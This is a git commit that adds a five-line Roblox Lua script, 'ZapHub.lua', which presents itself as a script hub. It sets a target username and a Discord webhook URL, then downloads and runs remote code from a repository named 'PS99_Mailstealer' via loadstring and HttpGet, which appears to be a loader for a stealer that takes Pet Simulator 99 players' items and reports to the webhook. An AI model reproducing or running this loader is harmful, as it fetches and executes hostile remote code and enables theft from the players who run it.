2a8ba92dc7b1eac0020f7ff1974a1f32e83f0d78
noplaceya <thisisnoplace@gmail.com>
2024-10-15 20:40:24 -0700

    Add files via upload

---
+++ ZapHub.lua
@@ -0,0 +1,5 @@
+Username = "Dinky_Mode"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1295948414881759242/ovqXZXSlViLPKLLnTNhPK9bmOgigCQyZKfMttFhXHupJZnB2Wcht3uPukle2KXY1Rsob"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
